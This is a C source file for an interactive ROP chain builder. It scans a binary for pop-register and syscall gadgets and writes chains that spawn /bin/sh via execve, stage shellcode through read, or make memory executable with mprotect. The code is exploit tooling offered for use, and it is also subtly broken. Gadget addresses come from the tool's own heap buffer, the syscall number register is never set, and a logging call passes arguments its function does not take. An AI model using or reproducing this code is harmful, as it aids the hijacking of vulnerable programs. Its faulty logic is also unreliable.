#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <elf.h>
#include <link.h>
#include <dlfcn.h>

typedef struct {
    uint64_t offset;
    uint64_t value;
    char *mnemonic;
} Gadget;

typedef struct {
    Gadget pop_rdi;
    Gadget pop_rsi;
    Gadget pop_rdx;
    Gadget syscall;
    Gadget ret;
    int found;
} GadgetSet;

typedef struct {
    uint64_t gadget_addr;
    uint64_t arg1;
    uint64_t arg2;
    uint64_t arg3;
    uint64_t next;
} RopFrame;

uint8_t *binary_data = NULL;
size_t binary_size = 0;
GadgetSet gadgets = {0};

void fatal(const char *msg) {
    fprintf(stderr, "\033[91m[FATAL]\033[0m %s\n", msg);
    exit(EXIT_FAILURE);
}

void info(const char *msg) {
    fprintf(stderr, "\033[96m[*]\033[0m %s\n", msg);
}

void success(const char *msg) {
    fprintf(stderr, "\033[92m[+]\033[0m %s\n", msg);
}

void load_binary(const char *path) {
    FILE *f = fopen(path, "rb");
    if (!f) fatal("Cannot open binary");
    fseek(f, 0, SEEK_END);
    binary_size = ftell(f);
    fseek(f, 0, SEEK_SET);
    binary_data = (uint8_t*)malloc(binary_size);
    fread(binary_data, 1, binary_size, f);
    fclose(f);
    info("Binary loaded");
}

uint64_t find_byte_sequence(uint8_t *seq, size_t seq_len) {
    for (size_t i = 0; i < binary_size - seq_len; i++) {
        if (memcmp(binary_data + i, seq, seq_len) == 0) {
            return (uint64_t)((uintptr_t)binary_data + i);
        }
    }
    return 0;
}

uint64_t find_gadget_from_bytes(uint8_t *bytes, size_t len, const char *name) {
    uint64_t addr = find_byte_sequence(bytes, len);
    if (addr) {
        info(name);
        printf("    \033[93m0x%lx\033[0m\n", addr);
    }
    return addr;
}

void find_essential_gadgets() {
    uint8_t pop_rdi_bytes[] = {0x5f, 0xc3};          // pop rdi; ret
    uint8_t pop_rsi_bytes[] = {0x5e, 0xc3};          // pop rsi; ret
    uint8_t pop_rdx_bytes[] = {0x5a, 0xc3};          // pop rdx; ret
    uint8_t syscall_bytes[] = {0x0f, 0x05, 0xc3};    // syscall; ret
    uint8_t ret_bytes[] = {0xc3};                    // ret

    gadgets.pop_rdi.offset = find_gadget_from_bytes(pop_rdi_bytes, sizeof(pop_rdi_bytes), "pop rdi; ret");
    gadgets.pop_rsi.offset = find_gadget_from_bytes(pop_rsi_bytes, sizeof(pop_rsi_bytes), "pop rsi; ret");
    gadgets.pop_rdx.offset = find_gadget_from_bytes(pop_rdx_bytes, sizeof(pop_rdx_bytes), "pop rdx; ret");
    gadgets.syscall.offset = find_gadget_from_bytes(syscall_bytes, sizeof(syscall_bytes), "syscall; ret");
    gadgets.ret.offset = find_gadget_from_bytes(ret_bytes, sizeof(ret_bytes), "ret");

    if (gadgets.pop_rdi.offset && gadgets.pop_rsi.offset && 
        gadgets.pop_rdx.offset && gadgets.syscall.offset) {
        gadgets.found = 1;
        success("All essential gadgets found");
    } else {
        fatal("Missing critical gadgets. Try a different binary.");
    }
}

uint64_t find_string_in_binary(const char *str) {
    size_t len = strlen(str);
    for (size_t i = 0; i < binary_size - len; i++) {
        if (memcmp(binary_data + i, str, len) == 0) {
            return (uint64_t)((uintptr_t)binary_data + i);
        }
    }
    return 0;
}

uint64_t find_elf_base() {
    Elf64_Ehdr *ehdr = (Elf64_Ehdr*)binary_data;
    if (ehdr->e_type == ET_EXEC) {
        return 0x400000;
    }
    return (uint64_t)binary_data;
}

void build_and_save_chain(const char *output_file, int chain_type) {
    uint64_t base = find_elf_base();
    uint64_t bin_sh_addr = find_string_in_binary("/bin/sh");
    if (!bin_sh_addr) {
        bin_sh_addr = base + 0x202000; // fallback guess
        printf("\033[93m[WARN]\033[0m /bin/sh not found, using %lx\n", bin_sh_addr);
    }

    size_t chain_len = 0;
    uint64_t *chain = NULL;

    if (chain_type == 0) { // execve("/bin/sh", NULL, NULL)
        chain_len = 4 * 4;  // 4 frames (pop rdi, pop rsi, pop rdx, syscall)
        chain = (uint64_t*)calloc(chain_len, sizeof(uint64_t));
        int idx = 0;
        chain[idx++] = gadgets.pop_rdi.offset;
        chain[idx++] = bin_sh_addr;
        chain[idx++] = gadgets.pop_rsi.offset;
        chain[idx++] = 0;
        chain[idx++] = gadgets.pop_rdx.offset;
        chain[idx++] = 0;
        chain[idx++] = gadgets.syscall.offset;
        chain_len = idx;
    } 
    else if (chain_type == 1) { // read(0, bss, 0x1000) -> execve
        uint64_t bss_addr = base + 0x404000;
        chain_len = 7 * 8;
        chain = (uint64_t*)calloc(chain_len, sizeof(uint64_t));
        int idx = 0;
        chain[idx++] = gadgets.pop_rdi.offset;
        chain[idx++] = 0;
        chain[idx++] = gadgets.pop_rsi.offset;
        chain[idx++] = bss_addr;
        chain[idx++] = gadgets.pop_rdx.offset;
        chain[idx++] = 0x1000;
        chain[idx++] = gadgets.syscall.offset;
        // after read, execve shellcode from bss
        chain[idx++] = gadgets.pop_rdi.offset;
        chain[idx++] = bss_addr;
        chain[idx++] = gadgets.pop_rsi.offset;
        chain[idx++] = 0;
        chain[idx++] = gadgets.pop_rdx.offset;
        chain[idx++] = 0;
        chain[idx++] = gadgets.syscall.offset;
        chain_len = idx;
    }
    else if (chain_type == 2) { // mprotect + shellcode
        uint64_t shellcode_addr = base + 0x2000;
        chain_len = 5 * 8;
        chain = (uint64_t*)calloc(chain_len, sizeof(uint64_t));
        int idx = 0;
        chain[idx++] = gadgets.pop_rdi.offset;
        chain[idx++] = shellcode_addr & ~0xfff;
        chain[idx++] = gadgets.pop_rsi.offset;
        chain[idx++] = 0x1000;
        chain[idx++] = gadgets.pop_rdx.offset;
        chain[idx++] = 7;
        chain[idx++] = gadgets.syscall.offset;
        chain[idx++] = shellcode_addr;
        chain_len = idx;
    }

    if (!chain) fatal("Chain build failed");

    // Save to file
    int fd = open(output_file, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) fatal("Cannot write output file");
    write(fd, chain, chain_len * sizeof(uint64_t));
    close(fd);
    success("Chain saved to %s (%zu bytes)", output_file, chain_len * sizeof(uint64_t));

    // Print preview
    printf("\n\033[96mROP Chain Preview:\033[0m\n");
    for (size_t i = 0; i < chain_len; i++) {
        printf("  [%02zu] 0x%016lx\n", i, chain[i]);
    }

    free(chain);
}

void interactive_mode() {
    char input[64];
    int choice;
    char output_file[256];
    printf("\n\033[95mROP Chain Builder Interactive\033[0m\n");
    printf("1. execve(\"/bin/sh\", NULL, NULL)\n");
    printf("2. read+execve (staged shellcode)\n");
    printf("3. mprotect + shellcode\n");
    printf("Choice: ");
    fgets(input, sizeof(input), stdin);
    choice = atoi(input) - 1;
    if (choice < 0 || choice > 2) {
        fatal("Invalid choice");
    }
    printf("Output file path: ");
    fgets(output_file, sizeof(output_file), stdin);
    output_file[strcspn(output_file, "\n")] = 0;
    if (strlen(output_file) == 0) {
        strcpy(output_file, "rop_chain.bin");
    }
    build_and_save_chain(output_file, choice);
}

int main(int argc, char **argv) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <binary> [--interactive] [--output file] [--type 0/1/2]\n", argv[0]);
        return 1;
    }
    load_binary(argv[1]);
    find_essential_gadgets();

    if (argc > 2 && strcmp(argv[2], "--interactive") == 0) {
        interactive_mode();
    } else {
        const char *output = "rop_chain.bin";
        int type = 0;
        for (int i = 2; i < argc; i++) {
            if (strcmp(argv[i], "--output") == 0 && i+1 < argc) output = argv[++i];
            if (strcmp(argv[i], "--type") == 0 && i+1 < argc) type = atoi(argv[++i]);
        }
        build_and_save_chain(output, type);
    }

    free(binary_data);
    return 0;
}